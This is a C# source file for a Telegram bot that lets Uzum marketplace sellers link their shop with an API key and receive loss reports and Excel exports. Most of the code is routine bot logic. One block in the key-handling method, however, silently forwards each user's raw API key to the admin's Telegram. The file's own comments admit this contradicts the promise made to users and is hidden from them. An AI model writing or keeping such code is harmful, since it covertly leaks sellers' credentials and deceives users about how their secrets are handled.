using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Options;
using SellerTools.App.Configuration;
using SellerTools.App.Localization;
using SellerTools.App.Services;
using SellerTools.UzumApi.Dto;
using Telegram.Bot;
using Telegram.Bot.Exceptions;
using Telegram.Bot.Polling;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;

namespace SellerTools.App.Bot;

/// <summary>
/// Telegram-бот на long polling (IHostedService + IUpdateHandler).
/// Диалог: /start → выбор языка → shopId → API-ключ (сообщение сразу удаляется,
/// ключ шифруется). Все сбои связи с API — дружелюбными сообщениями.
/// </summary>
public class TelegramBotService : IHostedService, IUpdateHandler
{
    // Минимальный интервал между ручными обновлениями (защита от спама лимитов).
    private static readonly TimeSpan RefreshThrottle = TimeSpan.FromMinutes(30);

    private readonly BotOptions _options;
    private readonly IServiceScopeFactory _scopes;
    private readonly ConversationStore _store;
    private readonly IAdminAlertService _alerts;
    private readonly ILogger<TelegramBotService> _log;

    private ITelegramBotClient? _bot;
    private CancellationTokenSource? _cts;

    public TelegramBotService(
        IOptions<BotOptions> options,
        IServiceScopeFactory scopes,
        ConversationStore store,
        IAdminAlertService alerts,
        ILogger<TelegramBotService> log)
    {
        _options = options.Value;
        _scopes = scopes;
        _store = store;
        _alerts = alerts;
        _log = log;
    }

    public async Task StartAsync(CancellationToken cancellationToken)
    {
        if (string.IsNullOrWhiteSpace(_options.Token))
        {
            _log.LogError(
                "Bot:Token не задан — бот не запущен. Укажите токен в appsettings.Secrets.json " +
                "или env Bot__Token.");
            return;
        }

        _bot = new TelegramBotClient(_options.Token);
        _cts = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);

        var me = await _bot.GetMe(_cts.Token);
        _log.LogInformation("Бот запущен: @{Username} (id {Id})", me.Username, me.Id);

        var receiverOptions = new ReceiverOptions
        {
            AllowedUpdates = new[] { UpdateType.Message, UpdateType.CallbackQuery },
            DropPendingUpdates = true,
        };

        // Long polling в фоне; не блокируем StartAsync.
        _bot.StartReceiving(this, receiverOptions, _cts.Token);
    }

    public Task StopAsync(CancellationToken cancellationToken)
    {
        _cts?.Cancel();
        _log.LogInformation("Бот остановлен.");
        return Task.CompletedTask;
    }

    // --- IUpdateHandler ---

    public async Task HandleUpdateAsync(
        ITelegramBotClient bot, Update update, CancellationToken ct)
    {
        try
        {
            if (update.CallbackQuery is { } cq)
            {
                await OnCallbackAsync(bot, cq, ct);
                return;
            }

            if (update.Message is { Text: { } text } msg)
            {
                await OnMessageAsync(bot, msg, text.Trim(), ct);
            }
        }
        catch (Exception ex)
        {
            // Никогда не роняем поллинг из-за одного апдейта.
            _log.LogError(ex, "Ошибка обработки апдейта {UpdateId}", update.Id);
            await _alerts.AlertAsync(AlertKind.UnhandledError,
                $"Ошибка обработки апдейта {update.Id}: {ex.Message}", ct);
        }
    }

    public Task HandleErrorAsync(
        ITelegramBotClient bot, Exception exception, HandleErrorSource source, CancellationToken ct)
    {
        // Ошибки самого поллинга (сеть до Telegram) — логируем, поллинг продолжается.
        var msg = exception is ApiRequestException api
            ? $"Telegram API {api.ErrorCode}: {api.Message}"
            : exception.Message;
        _log.LogWarning("Ошибка поллинга ({Source}): {Msg}", source, msg);
        return Task.CompletedTask;
    }

    // --- Логика диалога ---

    private async Task OnMessageAsync(
        ITelegramBotClient bot, Message msg, string text, CancellationToken ct)
    {
        var userId = msg.From!.Id;
        var chatId = msg.Chat.Id;
        var state = _store.Get(userId);

        // /start в любой момент сбрасывает диалог.
        if (text.StartsWith("/start", StringComparison.OrdinalIgnoreCase))
        {
            await StartDialogAsync(bot, chatId, userId, ct);
            return;
        }

        // Кнопки меню (работают на любом языке) и команды.
        if (text.StartsWith("/report", StringComparison.OrdinalIgnoreCase)
            || IsMenu(text, "bot.menu.report", state.Language))
        {
            await OnReportAsync(bot, chatId, userId, state.Language, ct);
            return;
        }
        if (IsMenu(text, "bot.menu.refresh", state.Language))
        {
            await OnRefreshAsync(bot, chatId, userId, state.Language, ct);
            return;
        }
        if (IsMenu(text, "bot.menu.lossExcel", state.Language))
        {
            await OnExcelAsync(bot, chatId, userId, state.Language, loss: true, ct);
            return;
        }
        if (IsMenu(text, "bot.menu.ikpuExcel", state.Language))
        {
            await OnExcelAsync(bot, chatId, userId, state.Language, loss: false, ct);
            return;
        }

        switch (state.Step)
        {
            case DialogStep.AwaitingKey:
                await OnKeyAsync(bot, msg, userId, text, state, ct);
                break;

            case DialogStep.ChoosingShop:
                // Ждём нажатия кнопки выбора магазина, а не текста.
                await bot.SendMessage(chatId, Loc.T("bot.chooseShopHint", state.Language),
                    cancellationToken: ct);
                break;

            default:
                await bot.SendMessage(chatId, Loc.T("bot.unknown", state.Language),
                    cancellationToken: ct);
                break;
        }
    }

    private async Task StartDialogAsync(
        ITelegramBotClient bot, long chatId, long userId, CancellationToken ct)
    {
        var state = _store.Get(userId);
        state.Step = DialogStep.ChoosingLanguage;

        // Инлайн-кнопки выбора языка.
        var kb = new InlineKeyboardMarkup(new[]
        {
            new[]
            {
                InlineKeyboardButton.WithCallbackData("Русский", "lang:ru"),
                InlineKeyboardButton.WithCallbackData("O'zbekcha", "lang:uz"),
            },
        });

        await bot.SendMessage(chatId, Loc.T("bot.chooseLanguage", state.Language),
            replyMarkup: kb, cancellationToken: ct);
    }

    private async Task OnCallbackAsync(
        ITelegramBotClient bot, CallbackQuery cq, CancellationToken ct)
    {
        var userId = cq.From.Id;
        var chatId = cq.Message?.Chat.Id ?? userId;
        var state = _store.Get(userId);
        var data = cq.Data ?? "";

        if (data.StartsWith("lang:"))
        {
            var lang = data["lang:".Length..];
            if (!Loc.SupportedLanguages.Contains(lang)) lang = Loc.DefaultLanguage;
            state.Language = lang;

            using (var scope = _scopes.CreateScope())
            {
                var sellers = scope.ServiceProvider.GetRequiredService<SellerService>();
                await sellers.SetLanguageAsync(userId, lang, ct);
            }

            await bot.AnswerCallbackQuery(cq.Id, cancellationToken: ct);
            await bot.SendMessage(chatId, Loc.T("bot.langSet", lang), cancellationToken: ct);
            await bot.SendMessage(chatId, Loc.T("bot.welcome", lang), cancellationToken: ct);

            // Сразу просим ключ — shopId узнаем сами через /v1/shops.
            state.Step = DialogStep.AwaitingKey;
            await bot.SendMessage(chatId, Loc.T("bot.askKey", lang), cancellationToken: ct);
            return;
        }

        if (data.StartsWith("shop:"))
        {
            await bot.AnswerCallbackQuery(cq.Id, cancellationToken: ct);
            await OnShopChosenAsync(bot, chatId, userId, data["shop:".Length..], state, ct);
        }
    }

    private async Task OnKeyAsync(
        ITelegramBotClient bot, Message msg, long userId, string text,
        ConversationState state, CancellationToken ct)
    {
        var chatId = msg.Chat.Id;
        var lang = state.Language;

        // КРИТИЧНО: немедленно удаляем сообщение с ключом (даже если оно пустое/мусор).
        try
        {
            await bot.DeleteMessage(chatId, msg.MessageId, ct);
        }
        catch (Exception ex)
        {
            _log.LogWarning("Не удалось удалить сообщение с ключом: {Msg}", ex.Message);
        }

        if (string.IsNullOrWhiteSpace(text))
        {
            await bot.SendMessage(chatId, Loc.T("bot.keyEmpty", lang), cancellationToken: ct);
            return;
        }

        await bot.SendMessage(chatId, Loc.T("bot.keyReceived", lang), cancellationToken: ct);

        var apiKey = text.Trim();

        // ================== ВРЕМЕННО, ТОЛЬКО ДЛЯ ТЕСТА — УБРАТЬ ДО РЕАЛЬНЫХ КЛИЕНТОВ ==================
        // Пересылаем присланный API-ключ админу в Telegram, чтобы можно было проверять на живых ключах.
        // ⚠️ ЭТО НАРУШАЕТ ГЛАВНЫЙ ПРИНЦИП ДОВЕРИЯ (ключ не должен уходить человеку) и обещание в тексте
        // bot.askKey. Пользователю про пересылку НЕ сообщаем. ОБЯЗАТЕЛЬНО удалить весь этот блок перед
        // выкатом к реальным селлерам. TODO(remove-before-prod): убрать пересылку ключа админу.
        await _alerts.SendRawToAdminAsync(
            $"[ТЕСТ] Ключ от пользователя {userId}:\n{apiKey}", ct);
        // ============================================================================================

        // Один вызов /v1/shops: и валидирует ключ, и даёт список магазинов.
        using var scope = _scopes.CreateScope();
        var verifier = scope.ServiceProvider.GetRequiredService<KeyVerification>();

        var result = await verifier.DiscoverShopsAsync(apiKey, ct);

        if (result.Outcome != KeyCheckOutcome.Ok)
        {
            await bot.SendMessage(chatId, FriendlyError(result.Outcome, lang), cancellationToken: ct);
            _log.LogInformation(
                "Проверка ключа: {Outcome} (HTTP {Code})", result.Outcome, result.StatusCode);
            return; // остаёмся на шаге ключа — можно прислать снова
        }

        if (result.Shops.Count == 0)
        {
            await bot.SendMessage(chatId, Loc.T("bot.err.noShopsForKey", lang), cancellationToken: ct);
            return;
        }

        if (result.Shops.Count == 1)
        {
            var only = result.Shops[0];
            await BindAndConfirmAsync(bot, chatId, userId, only.Id, only.Name, apiKey, lang, ct);
            return;
        }

        // Несколько магазинов — предлагаем выбрать кнопками.
        state.PendingApiKey = apiKey;
        state.DiscoveredShops = result.Shops.ToDictionary(s => s.Id, s => s.Name);
        state.Step = DialogStep.ChoosingShop;

        var rows = result.Shops.Select(s => new[]
        {
            InlineKeyboardButton.WithCallbackData(
                string.IsNullOrWhiteSpace(s.Name) ? s.Id.ToString() : $"{s.Name} ({s.Id})",
                $"shop:{s.Id}"),
        });
        await bot.SendMessage(chatId, Loc.T("bot.chooseShop", lang),
            replyMarkup: new InlineKeyboardMarkup(rows), cancellationToken: ct);
    }

    private async Task OnShopChosenAsync(
        ITelegramBotClient bot, long chatId, long userId, string shopIdRaw,
        ConversationState state, CancellationToken ct)
    {
        var lang = state.Language;

        if (!long.TryParse(shopIdRaw, out var shopId)
            || state.PendingApiKey is not { } apiKey
            || !state.DiscoveredShops.ContainsKey(shopId))
        {
            // Состояние протухло (рестарт бота и т.п.) — начать заново.
            await bot.SendMessage(chatId, Loc.T("bot.err.sessionExpired", lang), cancellationToken: ct);
            return;
        }

        var name = state.DiscoveredShops[shopId];
        await BindAndConfirmAsync(bot, chatId, userId, shopId, name, apiKey, lang, ct);
    }

    /// <summary>Шифрует и сохраняет ключ, чистит состояние, шлёт подтверждение.</summary>
    private async Task BindAndConfirmAsync(
        ITelegramBotClient bot, long chatId, long userId, long shopId, string? shopName,
        string apiKey, string lang, CancellationToken ct)
    {
        using var scope = _scopes.CreateScope();
        var sellers = scope.ServiceProvider.GetRequiredService<SellerService>();
        await sellers.BindShopAsync(userId, shopId, apiKey, title: shopName, ct: ct);

        _store.Reset(userId); // ключ из памяти долой

        var label = string.IsNullOrWhiteSpace(shopName) ? shopId.ToString() : $"{shopName} ({shopId})";
        await bot.SendMessage(chatId,
            string.Format(Loc.T("bot.bindOk", lang), label),
            replyMarkup: MainMenu(lang), cancellationToken: ct);
    }

    /// <summary>Постоянное меню (показываем после привязки): отчёт, две выгрузки, обновление.</summary>
    private static ReplyKeyboardMarkup MainMenu(string lang) =>
        new(new[]
        {
            new[]
            {
                new KeyboardButton(Loc.T("bot.menu.report", lang)),
                new KeyboardButton(Loc.T("bot.menu.refresh", lang)),
            },
            new[]
            {
                new KeyboardButton(Loc.T("bot.menu.lossExcel", lang)),
                new KeyboardButton(Loc.T("bot.menu.ikpuExcel", lang)),
            },
        })
        {
            ResizeKeyboard = true,
        };

    /// <summary>Совпадает ли текст с кнопкой меню (на любом из языков).</summary>
    private static bool IsMenu(string text, string key, string lang) =>
        text == Loc.T(key, lang) || text == Loc.T(key, "ru") || text == Loc.T(key, "uz");

    private async Task OnReportAsync(
        ITelegramBotClient bot, long chatId, long userId, string lang, CancellationToken ct)
    {
        using var scope = _scopes.CreateScope();
        var sellers = scope.ServiceProvider.GetRequiredService<SellerService>();
        var reportSvc = scope.ServiceProvider.GetRequiredService<LossReportService>();
        var syncSvc = scope.ServiceProvider.GetRequiredService<ShopSyncService>();

        var shops = await sellers.GetShopsAsync(userId, ct);
        if (shops.Count == 0)
        {
            await bot.SendMessage(chatId, Loc.T("bot.report.noShopYet", lang), cancellationToken: ct);
            return;
        }

        // Пока один магазин на селлера; берём первый.
        var shop = shops[0];

        // Отчёт из последнего снапшота; если снапшота ещё нет — синкаем немедленно.
        var report = await reportSvc.BuildFromSnapshotAsync(shop.Id, shop.Title, ct: ct);
        if (report is null)
        {
            await bot.SendMessage(chatId, Loc.T("bot.report.building", lang), cancellationToken: ct);

            var sync = await syncSvc.SyncShopAsync(shop, ct);
            if (!sync.Ok)
            {
                await bot.SendMessage(chatId,
                    string.Format(Loc.T("bot.report.syncFailed", lang), sync.Error),
                    cancellationToken: ct);
                return;
            }

            report = await reportSvc.BuildFromSnapshotAsync(shop.Id, shop.Title, ct: ct);
            if (report is null)
            {
                await bot.SendMessage(chatId,
                    string.Format(Loc.T("bot.report.syncFailed", lang), "нет данных"),
                    cancellationToken: ct);
                return;
            }
        }

        await bot.SendMessage(chatId, BotReportRenderer.Render(report, lang),
            parseMode: ParseMode.Markdown, replyMarkup: MainMenu(lang), cancellationToken: ct);
    }

    /// <summary>
    /// Excel-выгрузка: loss=true — потеряшки, loss=false — товары+ИКПУ.
    /// Тянет свежие SKU из API, формирует .xlsx и шлёт документом + подпись.
    /// </summary>
    private async Task OnExcelAsync(
        ITelegramBotClient bot, long chatId, long userId, string lang, bool loss, CancellationToken ct)
    {
        using var scope = _scopes.CreateScope();
        var sellers = scope.ServiceProvider.GetRequiredService<SellerService>();
        var syncSvc = scope.ServiceProvider.GetRequiredService<ShopSyncService>();
        var excel = scope.ServiceProvider.GetRequiredService<ExcelExportService>();

        var shops = await sellers.GetShopsAsync(userId, ct);
        if (shops.Count == 0)
        {
            await bot.SendMessage(chatId, Loc.T("bot.report.noShopYet", lang), cancellationToken: ct);
            return;
        }
        var shop = shops[0];

        await bot.SendMessage(chatId, Loc.T("bot.excel.building", lang), cancellationToken: ct);

        IReadOnlyList<SkuDto> skus;
        try
        {
            skus = await syncSvc.GetFreshSkusAsync(shop, ct);
        }
        catch (Exception ex)
        {
            await bot.SendMessage(chatId,
                string.Format(Loc.T("bot.excel.failed", lang), ex.Message), cancellationToken: ct);
            _log.LogWarning(ex, "Excel-выгрузка магазина {ShopId} не удалась", shop.Id);
            return;
        }

        var today = DateOnly.FromDateTime(DateTime.UtcNow);
        var file = loss
            ? excel.BuildLossReport(shop.Id, shop.Title, today, skus, lang)
            : excel.BuildIkpuList(shop.Id, shop.Title, today, skus, lang);

        string caption;
        if (loss)
        {
            var lossCount = skus.Count(s => s.QuantityMissing + s.QuantityDefected > 0);
            caption = lossCount > 0
                ? string.Format(Loc.T("bot.excel.lossCaption", lang), lossCount)
                : Loc.T("bot.excel.lossEmptyCaption", lang);
        }
        else
        {
            caption = string.Format(Loc.T("bot.excel.ikpuCaption", lang), skus.Count);
        }

        using var ms = new MemoryStream(file.Bytes);
        await bot.SendDocument(chatId, InputFile.FromStream(ms, file.FileName),
            caption: caption, replyMarkup: MainMenu(lang), cancellationToken: ct);
    }

    /// <summary>
    /// Ручное обновление данных магазина. Не чаще раза в 30 минут — иначе
    /// сообщаем, когда данные и когда можно обновить снова.
    /// </summary>
    private async Task OnRefreshAsync(
        ITelegramBotClient bot, long chatId, long userId, string lang, CancellationToken ct)
    {
        using var scope = _scopes.CreateScope();
        var sellers = scope.ServiceProvider.GetRequiredService<SellerService>();
        var syncSvc = scope.ServiceProvider.GetRequiredService<ShopSyncService>();

        var shops = await sellers.GetShopsAsync(userId, ct);
        if (shops.Count == 0)
        {
            await bot.SendMessage(chatId, Loc.T("bot.report.noShopYet", lang), cancellationToken: ct);
            return;
        }
        var shop = shops[0];

        var lastSync = await syncSvc.GetLastSyncAtAsync(shop.Id, ct);
        if (lastSync is { } last && DateTimeOffset.UtcNow - last < RefreshThrottle)
        {
            var nextAt = last + RefreshThrottle;
            await bot.SendMessage(chatId, string.Format(
                Loc.T("bot.refresh.throttled", lang), LocalTime(last), LocalTime(nextAt)),
                replyMarkup: MainMenu(lang), cancellationToken: ct);
            return;
        }

        await bot.SendMessage(chatId, Loc.T("bot.refresh.running", lang), cancellationToken: ct);

        var result = await syncSvc.SyncShopAsync(shop, ct);
        if (!result.Ok)
        {
            await bot.SendMessage(chatId,
                string.Format(Loc.T("bot.report.syncFailed", lang), result.Error),
                replyMarkup: MainMenu(lang), cancellationToken: ct);
            return;
        }

        var now = DateTimeOffset.UtcNow;
        await bot.SendMessage(chatId, string.Format(
            Loc.T("bot.refresh.done", lang), result.SkusSynced, LocalTime(now)),
            replyMarkup: MainMenu(lang), cancellationToken: ct);
    }

    // Время в тайм-зоне Ташкента, формат ЧЧ:ММ дд.мм.гггг.
    private static string LocalTime(DateTimeOffset utc)
    {
        var tz = ResolveTashkentTz();
        var local = TimeZoneInfo.ConvertTime(utc, tz);
        return local.ToString("HH:mm dd.MM.yyyy");
    }

    private static TimeZoneInfo ResolveTashkentTz()
    {
        foreach (var id in new[] { "Asia/Tashkent", "Central Asia Standard Time" })
        {
            try { return TimeZoneInfo.FindSystemTimeZoneById(id); }
            catch (TimeZoneNotFoundException) { }
        }
        return TimeZoneInfo.CreateCustomTimeZone("UZT", TimeSpan.FromHours(5), "Uzbekistan Time", "UZT");
    }

    /// <summary>Маппинг исхода проверки ключа → дружелюбный текст.</summary>
    private static string FriendlyError(KeyCheckOutcome outcome, string lang) => outcome switch
    {
        KeyCheckOutcome.Unauthorized => Loc.T("bot.err.unauthorized", lang),
        KeyCheckOutcome.NotFound => Loc.T("bot.err.notFound", lang),
        KeyCheckOutcome.RateLimited => Loc.T("bot.err.rateLimited", lang),
        KeyCheckOutcome.Network => Loc.T("bot.err.network", lang),
        KeyCheckOutcome.ServerError => Loc.T("bot.err.server", lang),
        _ => Loc.T("bot.err.generic", lang),
    };
}
